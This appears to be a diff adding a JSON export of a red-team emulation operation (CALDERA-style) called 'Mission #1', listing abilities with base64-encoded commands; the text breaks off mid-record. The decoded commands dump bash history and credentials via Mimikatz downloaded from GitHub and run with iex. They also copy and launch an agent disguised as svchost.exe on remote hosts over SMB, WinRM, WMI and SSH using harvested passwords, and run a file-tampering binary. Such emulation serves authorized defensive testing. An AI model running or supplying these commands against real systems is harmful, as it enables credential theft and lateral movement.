@@ -1,0 +1,756 @@
+{
+    "adversary": {
+        "adversary_id": "b43cc90c-5c08-4833-8144-09063e2e1ae2",
+        "description": "Moves around laterally and then modifies files of interest",
+        "id": 2,
+        "name": "Mission #1\n",
+        "phases": {
+            "1": [
+                {
+                    "ability_id": "02de522f-7e0a-4544-8afc-0c195f400f5f",
+                    "adversary_map_id": 13,
+                    "cleanup": "",
+                    "description": "Search for valid SSH commands in the config file",
+                    "executor": "sh",
+                    "id": 83,
+                    "name": "Parse SSH config",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "darwin",
+                    "requirements": [],
+                    "tactic": "collection",
+                    "technique_id": "T1005",
+                    "technique_name": "Data from Local System",
+                    "test": "cGlwIGluc3RhbGwgc3Rvcm1zc2ggJiYgc3Rvcm0gbGlzdA=="
+                },
+                {
+                    "ability_id": "02de522f-7e0a-4544-8afc-0c195f400f5f",
+                    "adversary_map_id": 13,
+                    "cleanup": "",
+                    "description": "Search for valid SSH commands in the config file",
+                    "executor": "sh",
+                    "id": 84,
+                    "name": "Parse SSH config",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "linux",
+                    "requirements": [],
+                    "tactic": "collection",
+                    "technique_id": "T1005",
+                    "technique_name": "Data from Local System",
+                    "test": "cGlwIGluc3RhbGwgc3Rvcm1zc2ggJiYgc3Rvcm0gbGlzdA=="
+                },
+                {
+                    "ability_id": "422526ec-27e9-429a-995b-c686a29561a4",
+                    "adversary_map_id": 14,
+                    "cleanup": "",
+                    "description": "Get contents of bash history",
+                    "executor": "sh",
+                    "id": 126,
+                    "name": "Dump history",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "darwin",
+                    "requirements": [],
+                    "tactic": "credential-access",
+                    "technique_id": "T1139",
+                    "technique_name": "Bash History",
+                    "test": "Y2F0IH4vLmJhc2hfaGlzdG9yeQ=="
+                },
+                {
+                    "ability_id": "422526ec-27e9-429a-995b-c686a29561a4",
+                    "adversary_map_id": 14,
+                    "cleanup": "",
+                    "description": "Get contents of bash history",
+                    "executor": "sh",
+                    "id": 127,
+                    "name": "Dump history",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "linux",
+                    "requirements": [],
+                    "tactic": "credential-access",
+                    "technique_id": "T1139",
+                    "technique_name": "Bash History",
+                    "test": "Y2F0IH4vLmJhc2hfaGlzdG9yeQ=="
+                },
+                {
+                    "ability_id": "530e47c6-8592-42bf-91df-c59ffbd8541b",
+                    "adversary_map_id": 15,
+                    "cleanup": "",
+                    "description": "Network Share Discovery",
+                    "executor": "cmd",
+                    "id": 23,
+                    "name": "View admin shares",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1135",
+                    "technique_name": "Network Share Discovery",
+                    "test": "bmV0IHNoYXJl"
+                },
+                {
+                    "ability_id": "530e47c6-8592-42bf-91df-c59ffbd8541b",
+                    "adversary_map_id": 15,
+                    "cleanup": "",
+                    "description": "Network Share Discovery",
+                    "executor": "psh",
+                    "id": 22,
+                    "name": "View admin shares",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1135",
+                    "technique_name": "Network Share Discovery",
+                    "test": "R2V0LVNtYlNoYXJl"
+                },
+                {
+                    "ability_id": "85341c8c-4ecb-4579-8f53-43e3e91d7617",
+                    "adversary_map_id": 16,
+                    "cleanup": "",
+                    "description": "Locate all active IP and FQDNs on the network",
+                    "executor": "sh",
+                    "id": 41,
+                    "name": "Collect ARP details",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "darwin",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1018",
+                    "technique_name": "Remove System Discovery",
+                    "test": "YXJwIC1h"
+                },
+                {
+                    "ability_id": "85341c8c-4ecb-4579-8f53-43e3e91d7617",
+                    "adversary_map_id": 16,
+                    "cleanup": "",
+                    "description": "Locate all active IP and FQDNs on the network",
+                    "executor": "sh",
+                    "id": 42,
+                    "name": "Collect ARP details",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "linux",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1018",
+                    "technique_name": "Remove System Discovery",
+                    "test": "YXJwIC1h"
+                },
+                {
+                    "ability_id": "85341c8c-4ecb-4579-8f53-43e3e91d7617",
+                    "adversary_map_id": 16,
+                    "cleanup": "",
+                    "description": "Locate all active IP and FQDNs on the network",
+                    "executor": "cmd",
+                    "id": 44,
+                    "name": "Collect ARP details",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1018",
+                    "technique_name": "Remove System Discovery",
+                    "test": "YXJwIC1h"
+                },
+                {
+                    "ability_id": "85341c8c-4ecb-4579-8f53-43e3e91d7617",
+                    "adversary_map_id": 16,
+                    "cleanup": "",
+                    "description": "Locate all active IP and FQDNs on the network",
+                    "executor": "psh",
+                    "id": 43,
+                    "name": "Collect ARP details",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1018",
+                    "technique_name": "Remove System Discovery",
+                    "test": "YXJwIC1h"
+                },
+                {
+                    "ability_id": "baac2c6d-4652-4b7e-ab0a-f1bf246edd12",
+                    "adversary_map_id": 17,
+                    "cleanup": "",
+                    "description": "Use powerkatz to execute mimikatz and attempt to grab plaintext and/or hashed passwords",
+                    "executor": "psh",
+                    "id": 129,
+                    "name": "Run PowerKatz",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "credential-access",
+                    "technique_id": "T1003",
+                    "technique_name": "Credential Dumping",
+                    "test": "W1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlcnZlckNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrID0geyAkVHJ1ZSB9Owokd2ViID0gKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpOwokcmVzdWx0ID0gJHdlYi5Eb3dubG9hZFN0cmluZygiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdC80YzdhMjAxNmZjNzkzMWNkMzcyNzNjNWQ4ZTE3YjE2ZDk1OTg2N2IzL0V4ZmlsdHJhdGlvbi9JbnZva2UtTWltaWthdHoucHMxIik7CmlleCAkcmVzdWx0OyBJbnZva2UtTWltaWthdHogLUR1bXBDcmVkcw=="
+                }
+            ],
+            "2": [
+                {
+                    "ability_id": "fa4ed735-7006-4451-a578-b516f80e559f",
+                    "adversary_map_id": 19,
+                    "cleanup": "",
+                    "description": "Find hostname of remote IP in domain",
+                    "executor": "psh",
+                    "id": 40,
+                    "name": "Reverse nslookup IP",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1018",
+                    "technique_name": "Remote System Discovery",
+                    "test": "bnNsb29rdXAgI3tyZW1vdGUuaG9zdC5pcH0="
+                },
+                {
+                    "ability_id": "fdf8bf36-797f-4157-805b-fe7c1c6fc903",
+                    "adversary_map_id": 18,
+                    "cleanup": "",
+                    "description": "Find hostname of remote host",
+                    "executor": "psh",
+                    "id": 53,
+                    "name": "Find Hostname",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "discovery",
+                    "technique_id": "T1018",
+                    "technique_name": "Remote System Discovery",
+                    "test": "bmJ0c3RhdCAtQSAje3JlbW90ZS5ob3N0LmlwfQ=="
+                }
+            ],
+            "3": [
+                {
+                    "ability_id": "4908fdc4-74fc-4d7c-8935-26d11ad26a8d",
+                    "adversary_map_id": 21,
+                    "cleanup": "c3NoIC1vIENvbm5lY3RUaW1lb3V0PTMgI3tyZW1vdGUuc3NoLmNtZH0gJ3JtIHNhbmRjYXQuZ28tbGludXgn",
+                    "description": "Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP",
+                    "executor": "sh",
+                    "id": 118,
+                    "name": "Copy 54ndc47 (WinRM and SCP)",
+                    "parsers": [],
+                    "payload": [
+                        {
+                            "ability": 118,
+                            "payload": "sandcat.go"
+                        }
+                    ],
+                    "platform": "darwin",
+                    "requirements": [],
+                    "tactic": "lateral-movement",
+                    "technique_id": "T1105",
+                    "technique_name": "Remote File Copy",
+                    "test": "c2NwIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBVc2VyS25vd25Ib3N0c0ZpbGU9L2Rldi9udWxsIC1vIENvbm5lY3RUaW1lb3V0PTMgc2FuZGNhdC5nby1saW51eCAje3JlbW90ZS5zc2guY21kfTp+"
+                },
+                {
+                    "ability_id": "4908fdc4-74fc-4d7c-8935-26d11ad26a8d",
+                    "adversary_map_id": 21,
+                    "cleanup": "c3NoIC1vIENvbm5lY3RUaW1lb3V0PTMgI3tyZW1vdGUuc3NoLmNtZH0gJ3JtIHNhbmRjYXQuZ28tbGludXgn",
+                    "description": "Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP",
+                    "executor": "sh",
+                    "id": 119,
+                    "name": "Copy 54ndc47 (WinRM and SCP)",
+                    "parsers": [],
+                    "payload": [
+                        {
+                            "ability": 119,
+                            "payload": "sandcat.go"
+                        }
+                    ],
+                    "platform": "linux",
+                    "requirements": [],
+                    "tactic": "lateral-movement",
+                    "technique_id": "T1105",
+                    "technique_name": "Remote File Copy",
+                    "test": "c2NwIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBVc2VyS25vd25Ib3N0c0ZpbGU9L2Rldi9udWxsIC1vIENvbm5lY3RUaW1lb3V0PTMgc2FuZGNhdC5nby1saW51eCAje3JlbW90ZS5zc2guY21kfTp+ICYm"
+                },
+                {
+                    "ability_id": "4908fdc4-74fc-4d7c-8935-26d11ad26a8d",
+                    "adversary_map_id": 21,
+                    "cleanup": "",
+                    "description": "Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP",
+                    "executor": "psh",
+                    "id": 116,
+                    "name": "Copy 54ndc47 (WinRM and SCP)",
+                    "parsers": [],
+                    "payload": [
+                        {
+                            "ability": 116,
+                            "payload": "sandcat.go-windows"
+                        }
+                    ],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "lateral-movement",
+                    "technique_id": "T1105",
+                    "technique_name": "Remote File Copy",
+                    "test": "JGpvYiA9IFN0YXJ0LUpvYiAtU2NyaXB0QmxvY2sgewogICR1c2VybmFtZSA9ICIje2hvc3QudXNlci5uYW1lfSI7CiAgJHBhc3N3b3JkID0gIiN7aG9zdC51c2VyLnBhc3N3b3JkfSI7CiAgJHNlY3N0ciA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5TZWN1cml0eS5TZWN1cmVTdHJpbmc7CiAgJHBhc3N3b3JkLlRvQ2hhckFycmF5KCkgfCBGb3JFYWNoLU9iamVjdCB7JHNlY3N0ci5BcHBlbmRDaGFyKCRfKX07CiAgJGNyZWQgPSBOZXctT2JqZWN0IC1UeXBlbmFtZSBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCAtQXJndW1lbnRsaXN0ICR1c2VybmFtZSwgJHNlY3N0cjsKICAkc2Vzc2lvbiA9IE5ldy1QU1Nlc3Npb24gLUNvbXB1dGVyTmFtZSAiI3tyZW1vdGUuaG9zdC5uYW1lfSIgLUNyZWRlbnRpYWwgJGNyZWQ7CiAgQ29weS1JdGVtIC1QYXRoICJzYW5kY2F0LmdvLXdpbmRvd3MiIC1EZXN0aW5hdGlvbiAiQzpcVXNlcnNcUHVibGljXHN2Y2hvc3QuZXhlIiAtVG9TZXNzaW9uICRzZXNzaW9uOwogIFN0YXJ0LVNsZWVwIC1zIDU7CiAgUmVtb3ZlLVBTU2Vzc2lvbiAtU2Vzc2lvbiAkc2Vzc2lvbjsKfTsKUmVjZWl2ZS1Kb2IgLUpvYiAkam9iIC1XYWl0Ow=="
+                },
+                {
+                    "ability_id": "4908fdc4-74fc-4d7c-8935-26d11ad26a8d",
+                    "adversary_map_id": 21,
+                    "cleanup": "",
+                    "description": "Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP",
+                    "executor": "pwsh",
+                    "id": 117,
+                    "name": "Copy 54ndc47 (WinRM and SCP)",
+                    "parsers": [],
+                    "payload": [
+                        {
+                            "ability": 117,
+                            "payload": "sandcat.go-windows"
+                        }
+                    ],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "lateral-movement",
+                    "technique_id": "T1105",
+                    "technique_name": "Remote File Copy",
+                    "test": "JGpvYiA9IFN0YXJ0LUpvYiAtU2NyaXB0QmxvY2sgewogICR1c2VybmFtZSA9ICIje2hvc3QudXNlci5uYW1lfSI7CiAgJHBhc3N3b3JkID0gIiN7aG9zdC51c2VyLnBhc3N3b3JkfSI7CiAgJHNlY3N0ciA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5TZWN1cml0eS5TZWN1cmVTdHJpbmc7CiAgJHBhc3N3b3JkLlRvQ2hhckFycmF5KCkgfCBGb3JFYWNoLU9iamVjdCB7JHNlY3N0ci5BcHBlbmRDaGFyKCRfKX07CiAgJGNyZWQgPSBOZXctT2JqZWN0IC1UeXBlbmFtZSBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCAtQXJndW1lbnRsaXN0ICR1c2VybmFtZSwgJHNlY3N0cjsKICAkc2Vzc2lvbiA9IE5ldy1QU1Nlc3Npb24gLUNvbXB1dGVyTmFtZSAiI3tyZW1vdGUuaG9zdC5uYW1lfSIgLUNyZWRlbnRpYWwgJGNyZWQ7CiAgQ29weS1JdGVtIC1QYXRoICJzYW5kY2F0LmdvLXdpbmRvd3MiIC1EZXN0aW5hdGlvbiAiQzpcVXNlcnNcUHVibGljXHN2Y2hvc3QuZXhlIiAtVG9TZXNzaW9uICRzZXNzaW9uOwogIFN0YXJ0LVNsZWVwIC1zIDU7CiAgUmVtb3ZlLVBTU2Vzc2lvbiAtU2Vzc2lvbiAkc2Vzc2lvbjsKfTsKUmVjZWl2ZS1Kb2IgLUpvYiAkam9iIC1XYWl0Ow=="
+                },
+                {
+                    "ability_id": "c5e75d70-09ae-469f-8717-621a1b7ef946",
+                    "adversary_map_id": 20,
+                    "cleanup": "ZXJhc2UgXFwje3JlbW90ZS5ob3N0LmlwfVxjJFxVc2Vyc1xQdWJpY1xzdmNob3N0LmV4ZSAvUSAvRiAmCm5ldCB1c2UgXFwje3JlbW90ZS5ob3N0LmlwfVxjJCAvZGVsZXRl",
+                    "description": "Copy 54ndc47 to remote host (SMB)",
+                    "executor": "cmd",
+                    "id": 113,
+                    "name": "Copy 54ndc47 (SMB)",
+                    "parsers": [],
+                    "payload": [
+                        {
+                            "ability": 113,
+                            "payload": "sandcat.go-windows"
+                        }
+                    ],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "lateral-movement",
+                    "technique_id": "T1105",
+                    "technique_name": "Remote File Copy",
+                    "test": "bmV0IHVzZSBcXCN7cmVtb3RlLmhvc3QuaXB9XGMkIC91c2VyOiN7aG9zdC51c2VyLm5hbWV9ICN7aG9zdC51c2VyLnBhc3N3b3JkfSAvcGVyc2lzdGVudDpubyAmCmNvcHkgL0IgL1kgc2FuZGNhdC5nby13aW5kb3dzIFxcI3tyZW1vdGUuaG9zdC5pcH1cYyRcVXNlcnNcUHViaWNcc3ZjaG9zdC5leGU="
+                },
+                {
+                    "ability_id": "c5e75d70-09ae-469f-8717-621a1b7ef946",
+                    "adversary_map_id": 20,
+                    "cleanup": "JGRyaXZlID0gIiN7cmVtb3RlLmhvc3QuaXB9Ii5yZXBsYWNlKCIuIiwiXyIpOwpSZW1vdmUtSXRlbSAtUGF0aCAkZHJpdmUiOlxVc2Vyc1xQdWJsaWNcc3ZjaG9zdC5leGUiIC1Gb3JjZTsKUmVtb3ZlLVBTRHJpdmUgLU5hbWUgJGRyaXZlOw==",
+                    "description": "Copy 54ndc47 to remote host (SMB)",
+                    "executor": "psh",
+                    "id": 112,
+                    "name": "Copy 54ndc47 (SMB)",
+                    "parsers": [],
+                    "payload": [
+                        {
+                            "ability": 112,
+                            "payload": "sandcat.go-windows"
+                        }
+                    ],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "lateral-movement",
+                    "technique_id": "T1105",
+                    "technique_name": "Remote File Copy",
+                    "test": "JHVzZXJuYW1lID0gIiN7aG9zdC51c2VyLm5hbWV9IjsKJHBhc3N3b3JkID0gIiN7aG9zdC51c2VyLnBhc3N3b3JkfSI7CiRzZWNzdHIgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uU2VjdXJpdHkuU2VjdXJlU3RyaW5nOwokcGFzc3dvcmQuVG9DaGFyQXJyYXkoKSB8IEZvckVhY2gtT2JqZWN0IHskc2Vjc3RyLkFwcGVuZENoYXIoJF8pfTsKJGNyZWQgPSBOZXctT2JqZWN0IC1UeXBlbmFtZSBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCAtQXJndW1lbnRsaXN0ICR1c2VybmFtZSwgJHNlY3N0cjsKJHBhdGggPSAkZW52OlVTRVJQUk9GSUxFKyJcc2FuZGNhdC5nby13aW5kb3dzIjsKJGRyaXZlID0gIiN7cmVtb3RlLmhvc3QuaXB9Ii5yZXBsYWNlKCIuIiwiXyIpOwpOZXctUFNEcml2ZSAtTmFtZSAkZHJpdmUgLVBTUHJvdmlkZXIgRmlsZVN5c3RlbSAtUm9vdCAiXFwje3JlbW90ZS5ob3N0LmlwfVxDJCIgLUNyZWRlbnRpYWwgJGNyZWQ7CkNvcHktSXRlbSAtUGF0aCAkcGF0aCAtRGVzdGluYXRpb24gJGRyaXZlIjpcVXNlcnNcUHVibGljXHN2Y2hvc3QuZXhlIjs="
+                }
+            ],
+            "4": [
+                {
+                    "ability_id": "10a9d979-e342-418a-a9b0-002c483e0fa6",
+                    "adversary_map_id": 24,
+                    "cleanup": "c3NoIC1vIENvbm5lY3RUaW1lb3V0PTMgI3tyZW1vdGUuc3NoLmNtZH0gJyhwa2lsbCAtZiBzYW5kY2F0KSc=",
+                    "description": "Copy 54ndc47 to remote host and start it",
+                    "executor": "sh",
+                    "id": 121,
+                    "name": "Start 54ndc47",
+                    "parsers": [],
+                    "payload": [
+                        {
+                            "ability": 121,
+                            "payload": "sandcat.go-linux"
+                        }
+                    ],
+                    "platform": "darwin",
+                    "requirements": [],
+                    "tactic": "lateral-movement",
+                    "technique_id": "T1184",
+                    "technique_name": "SSH Hijacking",
+                    "test": "c3NoIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBVc2VyS25vd25Ib3N0c0ZpbGU9L2Rldi9udWxsIC1vIENvbm5lY3RUaW1lb3V0PTMgI3tyZW1vdGUuc3NoLmNtZH0gJ25vaHVwIC4vc2FuZGNhdC5nby1saW51eCAxPi9kZXYvbnVsbCAyPi9kZXYvbnVsbCAmJw=="
+                },
+                {
+                    "ability_id": "10a9d979-e342-418a-a9b0-002c483e0fa6",
+                    "adversary_map_id": 24,
+                    "cleanup": "c3NoIC1vIENvbm5lY3RUaW1lb3V0PTMgI3tyZW1vdGUuc3NoLmNtZH0gJyhwa2lsbCAtZiBzYW5kY2F0KSc=",
+                    "description": "Copy 54ndc47 to remote host and start it",
+                    "executor": "sh",
+                    "id": 122,
+                    "name": "Start 54ndc47",
+                    "parsers": [],
+                    "payload": [
+                        {
+                            "ability": 122,
+                            "payload": "sandcat.go"
+                        }
+                    ],
+                    "platform": "linux",
+                    "requirements": [],
+                    "tactic": "lateral-movement",
+                    "technique_id": "T1184",
+                    "technique_name": "SSH Hijacking",
+                    "test": "c3NoIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBVc2VyS25vd25Ib3N0c0ZpbGU9L2Rldi9udWxsIC1vIENvbm5lY3RUaW1lb3V0PTMgI3tyZW1vdGUuc3NoLmNtZH0gJ25vaHVwIC4vc2FuZGNhdC5nby1saW51eCAxPi9kZXYvbnVsbCAyPi9kZXYvbnVsbCAmJw=="
+                },
+                {
+                    "ability_id": "2a32e46f-5346-45d3-9475-52b857c05342",
+                    "adversary_map_id": 22,
+                    "cleanup": "",
+                    "description": "Remotely executes 54ndc47 over WMI",
+                    "executor": "cmd",
+                    "id": 115,
+                    "name": "Start 54ndc47 (WMI)",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [
+                        {
+                            "ability": 115,
+                            "enforcements": {
+                                "edge": "has_password",
+                                "requirement_id": 2,
+                                "source": "host.user.name",
+                                "target": "host.user.password"
+                            },
+                            "id": 2,
+                            "module": "plugins.stockpile.app.requirements.basic"
+                        }
+                    ],
+                    "tactic": "lateral-movement",
+                    "technique_id": "T1047",
+                    "technique_name": "Windows Management Instrumentation",
+                    "test": "d21pYyAvbm9kZToje3JlbW90ZS5ob3N0LmlwfSAvdXNlcjoje2hvc3QudXNlci5uYW1lfSAvcGFzc3dvcmQ6I3tob3N0LnVzZXIucGFzc3dvcmR9IHByb2Nlc3MgY2FsbCBjcmVhdGUgImNtZC5leGUgL2MgQzpcVXNlcnNcUHVibGljXHN2Y2hvc3QuZXhlIC1zZXJ2ZXIgI3tzZXJ2ZXJ9IC1leGVjdXRvcnMgY21kIjs="
+                },
+                {
+                    "ability_id": "2a32e46f-5346-45d3-9475-52b857c05342",
+                    "adversary_map_id": 22,
+                    "cleanup": "",
+                    "description": "Remotely executes 54ndc47 over WMI",
+                    "executor": "psh",
+                    "id": 114,
+                    "name": "Start 54ndc47 (WMI)",
+                    "parsers": [],
+                    "payload": [],
+                    "platform": "windows",
+                    "requirements": [
+                        {
+                            "ability": 114,
+                            "enforcements": {
+                                "edge": "has_password",
+                                "requirement_id": 1,
+                                "source": "host.user.name",
+                                "target": "host.user.password"
+                            },
+                            "id": 1,
+                            "module": "plugins.stockpile.app.requirements.basic"
+                        }
+                    ],
+                    "tactic": "lateral-movement",
+                    "technique_id": "T1047",
+                    "technique_name": "Windows Management Instrumentation",
+                    "test": "d21pYyAvbm9kZToje3JlbW90ZS5ob3N0LmlwfSAvdXNlcjoje2hvc3QudXNlci5uYW1lfSAvcGFzc3dvcmQ6I3tob3N0LnVzZXIucGFzc3dvcmR9IHByb2Nlc3MgY2FsbCBjcmVhdGUgInBvd2Vyc2hlbGwuZXhlIEM6XFVzZXJzXFB1YmxpY1xzdmNob3N0LmV4ZSAtc2VydmVyICN7c2VydmVyfSAtZXhlY3V0b3JzIHBzaCI7"
+                },
+                {
+                    "ability_id": "41bb2b7a-75af-49fd-bd15-6c827df25921",
+                    "adversary_map_id": 23,
+                    "cleanup": "UmVtb3ZlLUl0ZW0gQzpcVXNlcnNcUHVibGljXHN2Y2hvc3QuZXhlIC1SZWN1cnNl",
+                    "description": "Start Agent using WinRM (WinRM)",
+                    "executor": "psh",
+                    "id": 123,
+                    "name": "Start Agent (WinRM)",
+                    "parsers": [],
+                    "payload": [
+                        {
+                            "ability": 123,
+                            "payload": "sandcat.go-windows"
+                        }
+                    ],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "lateral-movement",
+                    "technique_id": "T1021",
+                    "technique_name": "Remote Services",
+                    "test": "JHVzZXJuYW1lID0gIiN7aG9zdC51c2VyLm5hbWV9IjsKJHBhc3N3b3JkID0gIiN7aG9zdC51c2VyLnBhc3N3b3JkfSI7CiRzZWNzdHIgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uU2VjdXJpdHkuU2VjdXJlU3RyaW5nOwokcGFzc3dvcmQuVG9DaGFyQXJyYXkoKSB8IEZvckVhY2gtT2JqZWN0IHskc2Vjc3RyLkFwcGVuZENoYXIoJF8pfTsKJGNyZWQgPSBOZXctT2JqZWN0IC1UeXBlbmFtZSBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCAtQXJndW1lbnRsaXN0ICR1c2VybmFtZSwgJHNlY3N0cjsKJHNlc3Npb24gPSBOZXctUFNTZXNzaW9uIC1Db21wdXRlck5hbWUgI3tyZW1vdGUuaG9zdC5uYW1lfSAtQ3JlZGVudGlhbCAkY3JlZDsKSW52b2tlLUNvbW1hbmQgLVNlc3Npb24gJHNlc3Npb24gLVNjcmlwdEJsb2Nre3N0YXJ0LWpvYiAtc2NyaXB0YmxvY2t7Y21kLmV4ZSAvYyBzdGFydCBDOlxVc2Vyc1xQdWJsaWNcc3ZjaG9zdC5leGUgLXNlcnZlciAje3NlcnZlcn0gLWV4ZWN1dG9ycyBwc2h9fTsKU3RhcnQtU2xlZXAgLXMgNTsKUmVtb3ZlLVBTU2Vzc2lvbiAtU2Vzc2lvbiAkc2Vzc2lvbjs="
+                }
+            ],
+            "5": [
+                {
+                    "ability_id": "55f9600a-756f-496b-b27f-682052dc429c",
+                    "adversary_map_id": 25,
+                    "cleanup": "",
+                    "description": "Hunts for files of a certain extension and inserts a message",
+                    "executor": "sh",
+                    "id": 101,
+                    "name": "File Hunter Mission",
+                    "parsers": [],
+                    "payload": [
+                        {
+                            "ability": 101,
+                            "payload": "mission.go"
+                        }
+                    ],
+                    "platform": "darwin",
+                    "requirements": [],
+                    "tactic": "impact",
+                    "technique_id": "T1492",
+                    "technique_name": "Stored Data Manipulation",
+                    "test": "Li9taXNzaW9uLmdvIC1kdXJhdGlvbiA2MCAtZXh0ZW5zaW9uIC5jYWxkZXJhIC1kaXIgJy8n"
+                },
+                {
+                    "ability_id": "55f9600a-756f-496b-b27f-682052dc429c",
+                    "adversary_map_id": 25,
+                    "cleanup": "",
+                    "description": "Hunts for files of a certain extension and inserts a message",
+                    "executor": "sh",
+                    "id": 100,
+                    "name": "File Hunter Mission",
+                    "parsers": [],
+                    "payload": [
+                        {
+                            "ability": 100,
+                            "payload": "mission.go"
+                        }
+                    ],
+                    "platform": "linux",
+                    "requirements": [],
+                    "tactic": "impact",
+                    "technique_id": "T1492",
+                    "technique_name": "Stored Data Manipulation",
+                    "test": "Li9taXNzaW9uLmdvIC1kdXJhdGlvbiA2MCAtZXh0ZW5zaW9uIC5jYWxkZXJhIC1kaXIgJy8n"
+                },
+                {
+                    "ability_id": "55f9600a-756f-496b-b27f-682052dc429c",
+                    "adversary_map_id": 25,
+                    "cleanup": "",
+                    "description": "Hunts for files of a certain extension and inserts a message",
+                    "executor": "cmd",
+                    "id": 103,
+                    "name": "File Hunter Mission",
+                    "parsers": [],
+                    "payload": [
+                        {
+                            "ability": 103,
+                            "payload": "mission.go"
+                        }
+                    ],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "impact",
+                    "technique_id": "T1492",
+                    "technique_name": "Stored Data Manipulation",
+                    "test": "Y29weSBtaXNzaW9uLmdvIG1pc3Npb24uZXhlICYmCm1pc3Npb24uZXhlIC1kdXJhdGlvbiA2MCAtZXh0ZW5zaW9uIC5jYWxkZXJhIC1kaXIgQzpc"
+                },
+                {
+                    "ability_id": "55f9600a-756f-496b-b27f-682052dc429c",
+                    "adversary_map_id": 25,
+                    "cleanup": "",
+                    "description": "Hunts for files of a certain extension and inserts a message",
+                    "executor": "psh",
+                    "id": 102,
+                    "name": "File Hunter Mission",
+                    "parsers": [],
+                    "payload": [
+                        {
+                            "ability": 102,
+                            "payload": "mission.go"
+                        }
+                    ],
+                    "platform": "windows",
+                    "requirements": [],
+                    "tactic": "impact",
+                    "technique_id": "T1492",
+                    "technique_name": "Stored Data Manipulation",
+                    "test": "bXYgbWlzc2lvbi5nbyBtaXNzaW9uLmV4ZTsKLlxtaXNzaW9uLmV4ZSAtZHVyYXRpb24gNjAgLWV4dGVuc2lvbiAuY2FsZGVyYSAtZGlyICdDOlwnOw=="
+                }
+            ]
+        }
+    },
+    "facts": [],
+    "finish": "2019-10-24 14:10:26",
+    "host_group": [
+        {
+            "architecture": "amd64",
+            "executors": [
+                {
+                    "executor": "psh",
+                    "preferred": 1
+                },
+                {
+                    "executor": "shellcode_amd64",
+                    "preferred": 0
+                }
+            ],
+            "host_group": "my_group",
+            "id": 1,
+            "last_seen": "2019-10-24 14:10:26",
+            "last_trusted_seen": "2019-10-24 14:10:26",
+            "location": "C:\\Users\\Public\\sandcat.exe",
+            "paw": "AJ-Win7x64$AJ-Win7x64\\testuser",
+            "pid": 4340,
+            "platform": "windows",
+            "ppid": 3640,
+            "server": "http://10.203.202.154:8888",
+            "sleep_max": 60,
+            "sleep_min": 60,
+            "trusted": 1
+        }
+    ],
+    "id": 1,
+    "jitter": "100/200",
+    "name": "MISSION#1",
+    "planner": {
+        "id": 1,
+        "module": "plugins.stockpile.app.sequential",
+        "name": "sequential",
+        "params": {}
+    },
+    "skipped_abilities": [
+        {
+            "AJ-Win7x64$AJ-Win7x64\\testuser": [
+                {
+                    "ability_id": "02de522f-7e0a-4544-8afc-0c195f400f5f",
+                    "ability_name": "Parse SSH config",
+                    "reason": "Wrong platform",
+                    "reason_id": 0
+                },
+                {
+                    "ability_id": "422526ec-27e9-429a-995b-c686a29561a4",
+                    "ability_name": "Dump history",
+                    "reason": "Wrong platform",
+                    "reason_id": 0
+                },
+                {
+                    "ability_id": "fa4ed735-7006-4451-a578-b516f80e559f",
+                    "ability_name": "Reverse nslookup IP",
+                    "reason": "Fact dependency not fulfilled",
+                    "reason_id": 2
+                },
+                {
+                    "ability_id": "fdf8bf36-797f-4157-805b-fe7c1c6fc903",
